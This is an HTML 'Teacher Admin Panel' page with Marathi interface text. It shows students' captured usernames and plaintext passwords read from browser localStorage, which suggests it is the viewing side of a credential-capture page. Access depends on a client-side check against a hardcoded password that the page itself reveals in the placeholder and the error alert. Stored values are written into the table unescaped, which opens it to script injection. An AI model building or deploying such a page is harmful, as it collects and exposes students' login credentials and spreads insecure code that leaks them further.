<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Teacher Admin Panel</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: Arial, sans-serif;
  background: #f4f6f9;
  color: #333;
  padding: 20px;
}
.container {
  max-width: 800px;
  margin: 40px auto;
  background: white;
  padding: 30px;
  border-radius: 12px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}
h2 {
  color: #2c3e50;
  margin-bottom: 20px;
  text-align: center;
}
.login-box {
  text-align: center;
  padding: 20px;
}
.login-box input {
  padding: 12px;
  font-size: 16px;
  width: 60%;
  border: 1px solid #ccc;
  border-radius: 6px;
  margin-right: 10px;
}
.login-box button {
  padding: 12px 20px;
  font-size: 16px;
  background: #27ae60;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-weight: bold;
}
.login-box button:hover {
  background: #219653;
}
#adminPanel {
  display: none;
}
.controls {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
button.danger {
  background: #e74c3c;
  color: white;
  border: none;
  padding: 8px 15px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;
}
button.danger:hover {
  background: #c0392b;
}
table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 10px;
  font-size: 14px;
}
table, th, td {
  border: 1px solid #ddd;
  padding: 12px;
  text-align: left;
}
th {
  background: #f1f1f1;
  color: #333;
}
tr:nth-child(even) {
  background: #fafafa;
}
</style>
</head>
<body>

<div class="container">
  <h2>Teacher Admin Panel</h2>

  <!-- Password Protection Box -->
  <div id="authBox" class="login-box">
    <p style="margin-bottom: 15px; color: #666;">Students la ha page disnar nahi. Krupaya password taka:</p>
    <input type="password" id="adminPass" placeholder="Enter Password (admin123)">
    <button onclick="verifyAdmin()">Login</button>
  </div>

  <!-- Admin Panel Content -->
  <div id="adminPanel">
    <div class="controls">
      <h3>Student Login Submissions</h3>
      <button class="danger" onclick="clearData()">Clear All Data</button>
    </div>
    
    <div style="overflow-x: auto;">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>Username / Email</th>
            <th>Password</th>
          </tr>
        </thead>
        <tbody id="tableBody">
          <!-- Data populated dynamically -->
        </tbody>
      </table>
    </div>
  </div>
</div>

<script>
function verifyAdmin() {
  const pass = document.getElementById('adminPass').value;
  if (pass === "admin123") {
    document.getElementById('authBox').style.display = 'none';
    document.getElementById('adminPanel').style.display = 'block';
    loadSubmissions();
  } else {
    alert("Chuka password! Krupaya 'admin123' taka.");
  }
}

function loadSubmissions() {
  const tbody = document.getElementById('tableBody');
  tbody.innerHTML = '';
  
  // Fetching data from localStorage (shared across files in the same folder/domain)
  let submissions = JSON.parse(localStorage.getItem('studentLogins')) || [];

  if (submissions.length === 0) {
    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; color: #777;">Konihi student login kelele nahi.</td></tr>';
    return;
  }

  submissions.forEach(sub => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${sub.time}</td>
      <td>${sub.username}</td>
      <td>${sub.password}</td>
    `;
    tbody.appendChild(tr);
  });
}

function clearData() {
  if (confirm("Tumhi kharoch sagle student logins delete karu ichhita ka?")) {
    localStorage.removeItem('studentLogins');
    loadSubmissions();
  }
}
</script>

</body>
</html>
